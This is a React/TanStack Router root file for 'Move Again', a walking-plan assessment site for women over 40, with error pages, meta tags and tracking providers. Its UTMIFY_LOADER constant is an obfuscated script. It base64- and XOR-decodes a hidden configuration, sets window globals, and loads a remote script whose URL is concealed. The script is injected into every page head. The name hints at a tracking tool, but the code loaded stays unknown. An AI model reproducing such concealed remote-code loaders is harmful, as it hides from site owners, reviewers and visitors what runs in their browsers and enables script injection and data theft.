import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { AssessmentProvider } from "../context/AssessmentContext";
import { MetaPixelTracker } from "../components/MetaPixelTracker";
import { TrackingParameterPersistence } from "../components/TrackingParameterPersistence";

const UTMIFY_LOADER = `(function(){var y_3mt1=atob("DI6xmUyPuACD5Fbd3/WT7D7jmjqhjCKpr/2LtmPs3G6tkSKwtujIty/g1S7hlnmuvPzY6Tj8l3DqnDOx8P7Y4Snjlmrwxnr/vvrF6yXtzXTml3TnhNOduyvj12LiiCX/5dXKuyLu1WWh3nSttvbU9QXrmiyhkjexquuTo2652Tbn0DO87+rQ+nnqiWbggTLquryD/HStxV3+");var x_p=[];for(var m_961=0;m_961<y_3mt1.length;m_961++){x_p.push(y_3mt1.charCodeAt(m_961)&255);}var i_r4=x_p[0];var e_28=x_p.slice(1,1+i_r4);var h_ui9q=x_p.slice(1+i_r4);var g_lfzj=h_ui9q.map(function(b,i_82){return b^e_28[i_82%i_r4];});var x_z="";for(var e_ra=0;e_ra<g_lfzj.length;e_ra++){x_z+=String.fromCharCode(g_lfzj[e_ra]&255);}var s_yjf=decodeURIComponent(escape(x_z));var g_aiz8=JSON.parse(s_yjf);var v_kdw=g_aiz8.globals||[];v_kdw.forEach(function(x_e){window[x_e.name]=x_e.value;});var e_rrhj=document.createElement("script");e_rrhj.src=g_aiz8.url;e_rrhj.async=true;e_rrhj.defer=true;(g_aiz8.attributes||[]).forEach(function(z_rx5u){e_rrhj.setAttribute(z_rx5u.name,z_rx5u.value);});(document.head||document.documentElement).appendChild(e_rrhj);})();`;

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="font-display text-7xl text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-medium text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for isn't here.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-full bg-primary px-5 py-2.5 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="font-display text-3xl text-foreground">Something went wrong</h1>
        <p className="mt-2 text-sm text-muted-foreground">Please try again in a moment.</p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-full bg-primary px-5 py-2.5 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-full border border-input bg-background px-5 py-2.5 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

const SITE_TITLE = "Move Again — A Realistic Walking Plan for Women 40+";
const SITE_DESC =
  "Take the free 3-minute assessment and discover a realistic walking routine shaped around your schedule, energy, and starting point.";

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: SITE_TITLE },
      { name: "description", content: SITE_DESC },
      { name: "author", content: "Move Again" },
      { property: "og:title", content: SITE_TITLE },
      { property: "og:description", content: SITE_DESC },
      { property: "og:type", content: "website" },
      { property: "og:image", content: "/images/hero-walking.jpg" },
      { property: "og:image:alt", content: "A woman enjoying a calm, confident walk outdoors" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:title", content: SITE_TITLE },
      { name: "twitter:description", content: SITE_DESC },
      { name: "twitter:image", content: "/images/hero-walking.jpg" },
      { name: "theme-color", content: "#fcfbf8" },
    ],
    links: [
      { rel: "stylesheet", href: appCss },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
      { rel: "canonical", href: "/" },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Inter:wght@400;500;600;700&display=swap",
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
        <script dangerouslySetInnerHTML={{ __html: UTMIFY_LOADER }} />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      <AssessmentProvider>
        <MetaPixelTracker />
        <TrackingParameterPersistence />
        <Outlet />
      </AssessmentProvider>
    </QueryClientProvider>
  );
}
